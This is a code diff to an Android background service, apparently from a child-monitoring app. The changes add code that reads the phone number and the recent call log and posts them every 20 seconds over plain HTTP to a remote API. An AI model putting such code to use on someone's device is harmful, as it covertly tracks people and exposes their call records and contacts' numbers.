@@ -14,6 +14,7 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.android.volley.AuthFailureError;
 import com.android.volley.NetworkResponse;
@@ -25,6 +26,7 @@ import com.android.volley.toolbox.HttpHeaderParser;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
@@ -40,6 +42,12 @@ public class MyService extends Service {
     private MyService actual = null;
     private int count = 0;
     StringBuffer sb = new StringBuffer();
+    private int READ_PHONE_STATE=400;
+    private String phoneNumber;
+    private String cellLocation;
+    private String list;
+    private String childIdDeails="46b137f7-4b0e-4b78-bd62-ac00ddfbccd7";
+    private String childIdPhoneNumber="6bef5357-0a47-41a6-83ca-6dda0766fb05";
 
     public MyService() {
     }
@@ -69,7 +77,11 @@ public class MyService extends Service {
         if (count % 2 == 0) {
             System.out.println("myservice running" + new Date());
             //setDataForSimpleNotification();
-            sendData(getDetails());
+            System.out.println("getDetails::"+getDetails()+"getDetailsgetDetails");
+            System.out.println("phoneNumberphoneNumber::"+getDetails()+"getDetailsgetDetails");
+            sendData(getDetails(),childIdDeails);
+            sendData(phoneNumber,childIdPhoneNumber);
+
             //getDetails();
             System.out.println("failed failed");
         }
@@ -79,7 +91,7 @@ public class MyService extends Service {
         //System.out.println("\n Serive update");
         //job completed. Rest for 5 second before doing another one
         try {
-            Thread.sleep(5000);
+            Thread.sleep(20000);
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
@@ -88,11 +100,11 @@ public class MyService extends Service {
         startJob();
     }
 
-    private void sendData(String details) {
+    private void sendData(String details, String childId) {
 
         String id = getDeviceId(getApplicationContext());
         RequestQueue requestQueue = Volley.newRequestQueue(this);
-        String URL = "http://ptpapiapp.azurewebsites.net:80/api/Child/PostChildrenCategories?childId=46b137f7-4b0e-4b78-bd62-ac00ddfbccd7&categories=" + details;
+        String URL = "http://ptpapiapp.azurewebsites.net:80/api/Child/PostChildrenCategories?childId="+childId+"&categories=" + details;
         StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
             @Override
             public void onResponse(String response) {
@@ -150,23 +162,43 @@ public class MyService extends Service {
             //                                          int[] grantResults)
             // to handle the case where the user grants the permission. See the documentation
             // for ActivityCompat#requestPermissions for more details.
+            readPhoneStatePermission();
+
+        }
+        else {
             if (telephonyManager != null) {
+                phoneNumber=telephonyManager.getLine1Number();
+                cellLocation=telephonyManager.getLine1Number();
+                System.out.println("numbernumber:" + telephonyManager.getLine1Number());
+                System.out.println("numberLocation:" + telephonyManager.getAllCellInfo());
                 return telephonyManager.getDeviceId();
             }
-        }
-        if (telephonyManager != null) {
-            System.out.println("numbernumber:"+telephonyManager.getLine1Number());
-            System.out.println("numberLocation:"+telephonyManager.getCellLocation());
-            return telephonyManager.getDeviceId();
         }
         return null;
     }
 
+    private void readPhoneStatePermission() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+                == PackageManager.PERMISSION_GRANTED) {
+            // Permission is already available, start camera preview
+            Toast.makeText(this,"READ_PHONE_STATE is available. Starting preview.",Toast.LENGTH_SHORT).show();
+
+        } else {
+            // Permission is missing and must be requested.
+            //new DeviceAdminSample().requestPhoneStatePermission();
+        }
+    }
+
+
+
 
     private String getDetails() {
 
-        try {
+        try{
             StringBuffer sb = new StringBuffer();
+            StringBuffer sb1 = new StringBuffer();
+            ArrayList<String> mylist = new ArrayList<String>();
+            mylist.add(new Date().toString());
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                 // TODO: Consider calling
                 //    ActivityCompat#requestPermissions
@@ -182,7 +214,7 @@ public class MyService extends Service {
             int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
             int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
             int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
-            sb.append( "Call Details :");
+            sb.append( "Call Details-");
             while ( managedCursor.moveToNext() ) {
                 String phNumber = managedCursor.getString( number );
                 String callType = managedCursor.getString( type );
@@ -204,15 +236,37 @@ public class MyService extends Service {
                         dir = "MISSED";
                         break;
                 }
-                sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
-                sb.append("\n----------------------------------");
+                sb.append( "PN-"+phNumber +"CT-"+dir+"CDt-"+callDayTime+"CDur-"+callDuration );
+                sb1.append( "PN"+phNumber+"CD"+callDayTime+"CD"+callDuration );
+                mylist.add("PN-"+phNumber +"CT-"+dir+"CDt-"+callDayTime+"CDur-"+callDuration);
+                //sb.append("\n----------------------------------");
             }
             managedCursor.close();
             System.out.println("sbsbsb"+sb.toString());
+            StringBuilder list= new StringBuilder();
+            try {
+                for (int i=0;i<mylist.size();i++)
+                {
+                    if (i>=10)
+                        break;
+                    System.out.println("mylistmylist:"+mylist.get(mylist.size()-1-i));
+                    list.append(mylist.get(mylist.size()-1-i));
+
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            this.list= list.toString();
+            this.sb=sb;
         } catch (NumberFormatException e) {
             e.printStackTrace();
         }
-        return sb.toString();
+        list=new Date().toString()+list;
+        list=list.replace("GMT+05:30","");
+        list=list.replace(" ","-");
+        System.out.println("listlist"+list);
+
+        return list;
     }
 
 
